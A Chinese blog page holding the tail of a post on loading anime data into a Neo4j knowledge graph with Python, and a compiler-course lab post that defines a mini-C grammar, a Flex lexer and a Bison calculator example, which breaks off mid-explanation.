role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">                cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    MATCH (a:声优列表&#123;名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                          (b:角色列表&#123;名称:&#x27;%s&#x27;,图片:&#x27;%s&#x27;&#125;)</span></span><br><span class="line"><span class="string">                    MERGE (a)-[:配音]-&gt;(b)</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span> % (seiyuu_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_name_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                       role_img_list[j].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:制作公司&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:制作]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   author_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">            cql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                MATCH (a:番剧名称&#123;id:&#x27;%d&#x27;, 名称:&quot;%s&quot;&#125;),</span></span><br><span class="line"><span class="string">                      (b:播放平台&#123;名称:&quot;%s&quot;&#125;)</span></span><br><span class="line"><span class="string">                MERGE (b)-[:播放]-&gt;(a)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span> % (i,name_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                   platform_list[i].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">            graph.run(cql)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;step 4 down&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_graph = Graph(<span class="string">&quot;http://127.0.0.1:7474/browser/&quot;</span>, auth=(<span class="string">&quot;neo4j&quot;</span>, <span class="string">&quot;123456789&quot;</span>))</span><br><span class="line">    test_graph.run(<span class="string">&#x27;match(n) detach delete n&#x27;</span>)</span><br><span class="line">    kg = KG()</span><br><span class="line">    kg.createEntity(test_graph)</span><br><span class="line">    kg.createreRationship(test_graph)</span><br></pre></td></tr></table></figure>
<p>新设计了一个功能，使其可以列出知识图谱中所有的 <code>番剧名称</code> 实体：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055378300.png" class width="1679055378300"> 
<p>点击某个 <code>番剧名称</code> 实体可以查看其详细信息：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055425094.png" class width="1679055425094"> 
<p>点击角色列表中的 <code>角色</code> 实体，可以查看该实体的信息：</p>
<img src="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/1679055506519.png" class width="1679055506519"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/" class="post-title-link" itemprop="url">编译原理-Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-16 23:41:10" itemprop="dateCreated datePublished" datetime="2023-03-16T23:41:10+08:00">2023-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-19 18:27:37" itemprop="dateModified" datetime="2023-03-19T18:27:37+08:00">2023-03-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>27 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>任务目标：</p>
<ul>
<li>定义一个待实现编译器的语言，用上下文无关文法定义该语言</li>
<li>写出10个该语言编写的程序样例（覆盖所有文法规则），用于后续测试</li>
<li>给该语言起一个名称</li>
</ul>
<p>上下文无关文法 CFG（Context Free Grammar）是一组替换规则，描述了语句是如何形成</p>
<p>CFG 主要作用是验证一个输入字符串 input 是否符合某个文法 G（与正则表达式比较像，但是比正则表达式功能更强大）</p>
<p>具体的语法细节本人没有详细地了解过，下面给出一个简化的C语言的文法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">G[program]: </span><br><span class="line"> program → ExtDefList </span><br><span class="line"> ExtDefList→ExtDef ExtDefList | ε </span><br><span class="line"> ExtDef→Specifier ExtDecList ; |Specifier FunDec CompSt </span><br><span class="line"> Specifier→int | float </span><br><span class="line"> ExtDecList→VarDec | VarDec , ExtDecList </span><br><span class="line"> VarDec→ID </span><br><span class="line"> FucDec→ID ( VarList ) | ID ( ) </span><br><span class="line"> VarList→ParamDec , VarList | ParamDec </span><br><span class="line"> ParamDec→Specifier VarDec </span><br><span class="line"> </span><br><span class="line"> CompSt→&#123; DefList StmList &#125; </span><br><span class="line"> StmList→Stmt StmList | ε </span><br><span class="line"> Stmt→Exp ; | CompSt | return Exp ; </span><br><span class="line"> | if ( Exp ) Stmt | if ( Exp ) Stmt else Stmt | while ( Exp ) Stmt </span><br><span class="line"> DefList→Def DefList | ε </span><br><span class="line"> Def→Specifier DecList ; </span><br><span class="line"> DecList→Dec | Dec , DecList </span><br><span class="line"> Dec→VarDec | VarDec = Exp </span><br><span class="line"> Exp →Exp =Exp | Exp &amp;&amp; Exp | Exp || Exp | Exp &lt; Exp | Exp &lt;= Exp </span><br><span class="line"> | Exp == Exp | Exp != Exp | Exp &gt; Exp | Exp &gt;= Exp </span><br><span class="line"> | Exp + Exp | Exp - Exp | Exp * Exp | Exp / Exp | ID | INT | FLOAT </span><br><span class="line"> | ( Exp ) | - Exp | ! Exp | ID ( Args ) | ID ( ) </span><br><span class="line"> Args→Exp , Args | Exp </span><br></pre></td></tr></table></figure>
<ul>
<li>名称为 mini-c</li>
</ul>
<h2 id="第二个任务"><a href="#第二个任务" class="headerlink" title="第二个任务"></a>第二个任务</h2><ul>
<li>构建词法、语法分析器</li>
<li>用测试样例覆盖所有文法规则</li>
<li>能检出10个不同的词法错误</li>
<li>具有错误恢复功能，能检出10个不同的语法错误，并提示行号</li>
<li>对正确的样例，输出其语法树</li>
</ul>
<p><strong>工具 Flex 和 Bison</strong></p>
<p>Flex 是一个生成词法分析器的工具，利用 Flex，我们只需提供词法的正则表达式，就可自动生成对应的C代码 </p>
<p>Bison 是一种通用解析器生成器，它将带注释的上下文无关文法转换为使用 LALR(1) 解析器表的确定性 LR 或广义 LR（GLR）解析器</p>
<p>通过联合使用 Flex 和 Bison 来构造词法、语法分析程序，大致流程如下：</p>
<img src="/2023/03/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab1/1678937334684-1679205612532.png" class width="1678937334684"> 
<p><strong>词法分析</strong></p>
<p>核心步骤：</p>
<ul>
<li>设计能准确表示各类单词的正则表达式 </li>
<li>用正则表达式表示的词法规则等价转化为相应的有限自动机 FA</li>
<li>将其确定化、最小化，最后依据这个 FA 编写对应的词法分析程序 </li>
</ul>
<p>高级语言的词法分析器，需要识别的单词有五类：</p>
<ul>
<li>关键字（保留字），运算符，界符，常量，标识符 </li>
</ul>
<p>依据 mini-c 语言的定义，下面给出各单词的种类码和相应符号说明：  </p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INT</span> → 整型常量</span><br><span class="line"><span class="keyword">FLOAT</span> → 浮点型常量</span><br><span class="line">ID → 标识符</span><br><span class="line">ASSIGNOP → = </span><br><span class="line">RELOP → &gt; | &gt;= | &lt; | &lt;= | == | != </span><br><span class="line"><span class="keyword">PLUS</span> → + </span><br><span class="line"><span class="keyword">MINUS</span> → - </span><br><span class="line">STAR → * </span><br><span class="line"><span class="keyword">DIV</span> → / </span><br><span class="line">AND → &amp;&amp; </span><br><span class="line">OR → || </span><br><span class="line">NOT → ! </span><br><span class="line">TYPE → <span class="keyword">int</span> | <span class="keyword">float</span> </span><br><span class="line"><span class="keyword">RETURN</span> → <span class="keyword">return</span> </span><br><span class="line"><span class="keyword">IF</span> → <span class="keyword">if</span> </span><br><span class="line"><span class="keyword">ELSE</span> → <span class="keyword">else</span> </span><br><span class="line"><span class="keyword">WHILE</span> → <span class="keyword">while</span> </span><br><span class="line">SEMI → ;</span><br><span class="line">COMMA → ,</span><br><span class="line">LP → (</span><br><span class="line">RP → )</span><br><span class="line">LC → &#123; </span><br><span class="line">RC → &#125; </span><br></pre></td></tr></table></figure>
<ul>
<li>这里有关的单词种类码：<code>INT,FLOAT,......,WHILE</code> 每一个对应一个整数值作为其单词的种类码</li>
<li>实现时不需要自己指定这个值，当词法分析程序生成工具 Flex 和语法分析程序生成器 Bison 联合使用时，将这些单词符号以 %token 的形式在 Bison 的文件 <code>parser.y</code> 中罗列出来，就可生成头文件 <code>parser.tab.h</code>，以枚举常量的形式给这些单词种类码进行自动编号</li>
</ul>
<p>在编写 Flex 文件之前，需要先了解 Flex 的文件格式：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">定义部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">规则部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">用户子程序部分 </span><br></pre></td></tr></table></figure>
<ul>
<li>Flex 文件是文件扩展名为 <code>.l</code> 的文本文件 </li>
<li>定义部分：<ul>
<li>主要包含c语言的一些宏定义，如文件包含、宏名定义，以及一些变量和类型的定义和声明</li>
</ul>
</li>
<li>规则部分：<ul>
<li>由规则 <code>正规表达式 动作</code> 组成</li>
<li>词法分析器一旦识别出正规表达式所对应的单词，就会执行动作所对应的操作，返回单词的种类码（常规操作：把读取到的单词以各种形式保存在联合变量 YYLVAL 中）</li>
<li>词法分析器识别出一个单词后，会将该单词保存在 <code>yytext</code> 中，其长度为 <code>yyleng</code></li>
</ul>
</li>
<li>用户子程序部分：<ul>
<li>这部分代码会原封不动的被复制到词法分析器源程序 <code>lex.yy.c</code> 中</li>
</ul>
</li>
</ul>
<p>实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* yylineno记录行号 */</span></span><br><span class="line">%option yylineno  </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 定义部分 */</span></span><br><span class="line">%&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;parser.tab.h&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line">    <span class="keyword">int</span> yycolumn = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> YY_USER_ACTION yylloc.first_line=yylloc.last_line=yylineno; yylloc.first_column=yycolumn; yylloc.last_column=yycolumn+yyleng-1; yycolumn+=yyleng;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> type_int;</span><br><span class="line">        <span class="keyword">float</span> type_float;</span><br><span class="line">        <span class="keyword">char</span> type_char;</span><br><span class="line">        <span class="keyword">char</span> type_id[<span class="number">32</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    &#125;YYLVAL;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> YYSTYPE YYLVAL</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 匹配:不以数字开头的字符串 */</span></span><br><span class="line">id [A-Za-z][A-Za-z0<span class="number">-9</span>]* </span><br><span class="line"><span class="comment">/* 匹配:数字 */</span></span><br><span class="line"><span class="keyword">int</span> [<span class="number">0</span><span class="number">-9</span>]+ </span><br><span class="line"><span class="comment">/* 匹配:带有&#x27;.&#x27;的数字 */</span></span><br><span class="line"><span class="keyword">float</span> ([<span class="number">0</span><span class="number">-9</span>]*\.[<span class="number">0</span><span class="number">-9</span>]+)|([<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]*) </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 规则部分 */</span></span><br><span class="line">%%</span><br><span class="line">\/\/[^\n]*  &#123;;&#125; <span class="comment">// 匹配单行注释</span></span><br><span class="line">\/\*(\s|.)*?\*\/ &#123;;&#125; <span class="comment">// 匹配多行注释</span></span><br><span class="line">&#123;<span class="keyword">int</span>&#125; &#123;yylval.type_int=atoi(yytext); <span class="keyword">return</span> INT;&#125; <span class="comment">// 执行int规则(匹配数字)</span></span><br><span class="line">&#123;<span class="keyword">float</span>&#125; &#123;yylval.type_float=atof(yytext); <span class="keyword">return</span> FLOAT;&#125; <span class="comment">// 执行float规则(匹配带有&#x27;.&#x27;的数字)</span></span><br><span class="line"><span class="string">&quot;int&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配int</span></span><br><span class="line"><span class="string">&quot;float&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配float</span></span><br><span class="line"><span class="string">&quot;char&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配char</span></span><br><span class="line"><span class="string">&quot;return&quot;</span> &#123;<span class="keyword">return</span> RETURN;&#125;</span><br><span class="line"><span class="string">&quot;if&quot;</span> &#123;<span class="keyword">return</span> IF;&#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span> &#123;<span class="keyword">return</span> ELSE;&#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span> &#123;<span class="keyword">return</span> WHILE;&#125;</span><br><span class="line"><span class="string">&quot;for&quot;</span> &#123;<span class="keyword">return</span> FOR;&#125;</span><br><span class="line">&#123;id&#125; &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> ID;&#125; <span class="comment">// 执行id规则(匹配不以数字开头的字符串)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;&quot;</span> &#123;<span class="keyword">return</span> SEMI;&#125;</span><br><span class="line"><span class="string">&quot;,&quot;</span> &#123;<span class="keyword">return</span> COMMA;&#125;</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>|<span class="string">&quot;&lt;&quot;</span>|<span class="string">&quot;&gt;=&quot;</span>|<span class="string">&quot;&lt;=&quot;</span>|<span class="string">&quot;==&quot;</span>|<span class="string">&quot;!=&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> RELOP;&#125;</span><br><span class="line"><span class="string">&quot;=&quot;</span> &#123;<span class="keyword">return</span> ASSIGNOP;&#125;</span><br><span class="line"><span class="string">&quot;+&quot;</span> &#123;<span class="keyword">return</span> PLUS;&#125;</span><br><span class="line"><span class="string">&quot;-&quot;</span> &#123;<span class="keyword">return</span> MINUS;&#125;</span><br><span class="line"><span class="string">&quot;+=&quot;</span> &#123;<span class="keyword">return</span> COMADD;&#125;</span><br><span class="line"><span class="string">&quot;-=&quot;</span> &#123;<span class="keyword">return</span> COMSUB;&#125;</span><br><span class="line"><span class="string">&quot;++&quot;</span> &#123;<span class="keyword">return</span> AUTOADD;&#125;</span><br><span class="line"><span class="string">&quot;--&quot;</span> &#123;<span class="keyword">return</span> AUTOSUB;&#125;</span><br><span class="line"><span class="string">&quot;*&quot;</span> &#123;<span class="keyword">return</span> STAR;&#125;</span><br><span class="line"><span class="string">&quot;/&quot;</span> &#123;<span class="keyword">return</span> DIV;&#125;</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span> &#123;<span class="keyword">return</span> AND;&#125;</span><br><span class="line"><span class="string">&quot;||&quot;</span> &#123;<span class="keyword">return</span> OR;&#125;</span><br><span class="line"><span class="string">&quot;!&quot;</span> &#123;<span class="keyword">return</span> NOT;&#125;</span><br><span class="line"><span class="string">&quot;(&quot;</span> &#123;<span class="keyword">return</span> LP;&#125;</span><br><span class="line"><span class="string">&quot;)&quot;</span> &#123;<span class="keyword">return</span> RP;&#125;</span><br><span class="line"><span class="string">&quot;[&quot;</span> &#123;<span class="keyword">return</span> LB;&#125;</span><br><span class="line"><span class="string">&quot;]&quot;</span> &#123;<span class="keyword">return</span> RB;&#125;</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span> &#123;<span class="keyword">return</span> LC;&#125;</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span> &#123;<span class="keyword">return</span> RC;&#125;</span><br><span class="line">[\n] &#123;yycolumn=<span class="number">1</span>;&#125;</span><br><span class="line">[ \r\t] &#123;;&#125;</span><br><span class="line">.   &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A: Mysterious character\&quot;%s\&quot; at line %d,column %d\n&quot;</span>,yytext,yylineno,yycolumn);&#125;</span><br><span class="line">%%</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 用户子程序部分 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>语法分析</strong></p>
<p>语法分析采用生成器自动化生成工具 GNU Bison（前身是 YACC），该工具采用了 LALR(1) 的自底向上的分析技术，完成语法分析</p>
<p>在编写 Bison 文件之前，需要先了解 Bison 的文件格式：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>&#123; </span><br><span class="line">声明部分</span><br><span class="line"><span class="meta">%</span>&#125; </span><br><span class="line">辅助定义部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">规则部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">用户函数部分</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Bison 文件是文件扩展名为 <code>.y</code> 的文本文件 </p>
</li>
<li><p>声明部分：</p>
<ul>
<li>包含语法分析中需要的头文件包含，宏定义和全局变量的定义等，这部分会直接被复制到语法分析的C语言源程序中 </li>
</ul>
</li>
<li><p>辅助定义部分：</p>
<ul>
<li>语义值的类型定义</li>
<li>非终结符的属性值类型说明（非终结符：不是终结符的都是非终结符）</li>
<li>终结符语义值类型定义（终结符：不能单独出现在推导式左边的符号）</li>
<li>优先级与结合性定义 </li>
</ul>
</li>
<li><p>规则部分：</p>
<ul>
<li><p>采用 LR 分析法，需要在每条规则后给出相应的语义动作，例如：</p>
<ul>
<li><p>规则：<code>Exp → Exp = Exp</code></p>
</li>
<li><p>语义动作：<code>Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$1,$3,NULL,yylineno); &#125;</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>用户子程序部分：</p>
<ul>
<li>这部分代码会原封不动的被复制到词法分析器源程序 <code>lex.yy.c</code> 中</li>
</ul>
</li>
</ul>
<p>语法分析的过程比较复杂，先看一个案例：</p>
<p>calc.l：Flex 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;calc.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+          &#123; yylval = atoi(yytext); <span class="keyword">return</span> T_NUM; &#125;</span><br><span class="line">[-/+*()\n]      &#123; <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line">.               &#123; <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* end when meet everything else */</span> &#125;</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用正则匹配数字，将目标数字存储于 <code>yylval</code> 中并返回 T_NUM</li>
<li>使用正则匹配符号，并返回该符号（<code>yytext[0]</code>）</li>
</ul>
<p>calc.y：Bison 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;&#125;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%token T_NUM</span><br><span class="line"></span><br><span class="line">%left <span class="string">&#x27;+&#x27;</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">%left <span class="string">&#x27;*&#x27;</span> <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">S   :   S E <span class="string">&#x27;\n&#x27;</span>        &#123; <span class="built_in">printf</span>(<span class="string">&quot;ans = %d\n&quot;</span>, $<span class="number">2</span>); &#125;</span><br><span class="line">    |   <span class="comment">/* empty */</span>     &#123; <span class="comment">/* empty */</span> &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">E   :   E <span class="string">&#x27;+&#x27;</span> E         &#123; $$ = $<span class="number">1</span> + $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;-&#x27;</span> E         &#123; $$ = $<span class="number">1</span> - $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;*&#x27;</span> E         &#123; $$ = $<span class="number">1</span> * $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;/&#x27;</span> E         &#123; $$ = $<span class="number">1</span> / $<span class="number">3</span>; &#125;</span><br><span class="line">    |   T_NUM           &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    |   <span class="string">&#x27;(&#x27;</span> E <span class="string">&#x27;)&#x27;</span>       &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> yyparse();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>规则后面 <code>&#123;&#125;</code> 中的是当完成归约时要执行的语义动作</li>
<li>规则左部的E的属性值用$$表示，右部有2个E，其属性值分别用$1和$3表示<ul>
<li>例如：<code>A : B &#39;+&#39; C &#123;$$ = $1 + $3;&#125;</code></li>
<li>$$ 代指 A</li>
<li>$1 代指 B</li>
<li>$2 代指 +</li>
